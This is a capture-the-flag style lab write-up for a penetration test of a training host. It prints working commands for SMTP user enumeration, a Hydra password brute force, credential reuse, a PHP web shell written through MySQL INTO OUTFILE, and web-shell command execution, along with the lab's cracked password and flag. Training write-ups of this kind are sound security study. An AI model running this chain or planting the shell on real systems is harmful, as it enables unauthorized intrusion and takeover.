# Skills Assessment

## Context
> We were commissioned by the company **Inlanefreight** to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format: **HTB{...}**

## Targets (3 Hosts)

### Server 1 — Email, Customers & Files
- **Role:** Email server, customer management, file management
- **IP:** 10.129.203.7
- **OS:** Windows Server (XAMPP stack)
- **Difficulty:** Easy
- **Status:** ✅ COMPROMISED

### Server 2
- **IP / URL:** *(TBD)*
- **OS:** *(TBD)*
- **Difficulty:** Easy
- **Status:** ⏳ Pending

### Server 3
- **IP / URL:** *(TBD)*
- **OS:** *(TBD)*
- **Difficulty:** Easy
- **Status:** ⏳ Pending

## Recon

### Nmap Scan Results
```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Core FTP Server
25/tcp   open  smtp          hMailServer smtpd (AUTH LOGIN PLAIN)
80/tcp   open  http          Apache/2.4.53 (XAMPP)
443/tcp  open  https         Apache/2.4.53 (Basic Auth)
587/tcp  open  smtp          hMailServer smtpd (AUTH LOGIN PLAIN)
3306/tcp open  mysql         MariaDB 5.5.5-10.4.24
3389/tcp open  ms-wbt-server Microsoft Terminal Services (RDP)
```

### Service Enum
- **SMTP (25/587):** hMailServer, AUTH LOGIN PLAIN enabled
- **FTP (21):** Core FTP Server, TLS enabled, no anonymous access
- **HTTP (80):** XAMPP welcome page
- **HTTPS (443):** HTTP Basic Authentication required
- **MySQL (3306):** MariaDB — potential hMailServer backend
- **RDP (3389):** Windows Terminal Services


## Exploitation
### Server 1 — Complete Attack Chain

**Phase 1: SMTP User Enumeration**
```bash
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt \
  -D inlanefreight.htb -t 10.129.203.7
```
**Result:** `fiona@inlanefreight.htb` exists

**Phase 2: Password Brute Force (SMTP AUTH)**
```bash
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt \
  smtp://10.129.203.7:587 -t 32
```
**Result:** `fiona@inlanefreight.htb` / `987654321`

**Phase 3: Credential Reuse & Service Access**

| Service | Credentials | Result |
|---------|-------------|--------|
| SMTP (587) | `fiona:987654321` | ✅ Valid — initial foothold |
| FTP (21) | `fiona:987654321` | ✅ Valid — data connection issues (EPSV/PASV blocked) |
| HTTP Basic Auth (443) | `fiona:987654321` | ✅ Valid — CoreFTP upload portal access |
| MySQL (3306) | `fiona:987654321` | ✅ Valid — **critical finding** |
| RDP (3389) | `fiona:987654321` | ❌ Invalid |

**Phase 4: MySQL → RCE (The Key Pivot)**

MySQL `secure_file_priv` was **empty** (`''`), allowing unrestricted file writes:
```sql
-- Verified: can write anywhere
SHOW VARIABLES LIKE "secure_file_priv";
-- Result: empty string = no restrictions

-- Write PHP web shell to Apache web root
USE test;
SELECT "<?php system(\$_GET['cmd']); ?>" 
  INTO OUTFILE 'C:/xampp/htdocs/shell.php';
```

**Phase 5: Web Shell → Reverse Shell**
```bash
# Verify RCE
curl "http://inlanefreight.htb/shell.php?cmd=whoami"
# Result: nt authority\system

# Upgrade to interactive PowerShell reverse shell
# Via web shell — download and execute PowerShell payload
```

**Phase 6: Flag Capture**
```powershell
# Located in Administrator's Desktop
cd C:\Users\Administrator\Desktop
type flag.txt
```
**Flag:** `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`

### Server 2
```bash
# commands, payloads
```

### Server 3
```bash
# commands, payloads
```

## Flags
| Server | Host | Flag | Status |
|--------|------|------|--------|
| 1 | Email/Files | `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}` | ✅ **CAPTURED** |
| 2 | TBD | HTB{...} | ⏳ Pending |
| 3 | TBD | HTB{...} | ⏳ Pending |

## Credentials Discovered

| Account | Password | Source | Valid On |
|---------|----------|--------|----------|
| `fiona@inlanefreight.htb` | `987654321` | Hydra (SMTP AUTH) | SMTP, FTP, HTTP Basic Auth, MySQL |

## Attack Chain Summary (Server 1)

```
SMTP RCPT enum → fiona@inlanefreight.htb discovered
    ↓
Hydra brute force SMTP AUTH → password: 987654321
    ↓
MySQL login with fiona creds → secure_file_priv = '' (empty)
    ↓
SELECT INTO OUTFILE → PHP web shell in C:\xampp\htdocs\shell.php
    ↓
Web shell RCE as NT AUTHORITY\SYSTEM
    ↓
PowerShell reverse shell → interactive access
    ↓
Flag captured from C:\Users\Administrator\Desktop\flag.txt
```

## Lessons Learned

### Server 1
- **SMTP user enumeration** with `RCPT TO:` is reliable for discovering valid email accounts
- **Hydra against SMTP AUTH** can crack weak passwords quickly (rockyou, 32 threads)
- **Credential reuse is critical** — fiona's password worked across SMTP, FTP, HTTP, and MySQL
- **MySQL `secure_file_priv`** being empty is a **critical misconfiguration** — allows direct RCE via `INTO OUTFILE`
- **PHP shells in web root** give immediate SYSTEM privileges on Windows XAMPP (runs as SYSTEM)
- **FTP passive/active mode issues** are common — don't get stuck; pivot to other vectors (MySQL was the key)
- **Web upload forms** may have PHP execution disabled in uploads directory — always check if you can write to web root instead

### Tools Used
- `smtp-user-enum` — SMTP user enumeration
- `hydra` — SMTP AUTH brute force
- `mysql` client — MySQL access with `--skip-ssl`
- `curl` — web shell interaction
- `nc` — reverse shell listener

---

*Updated: 2026-04-22 18:55 UTC+8*
*Server 1 Status: ✅ COMPROMISED*
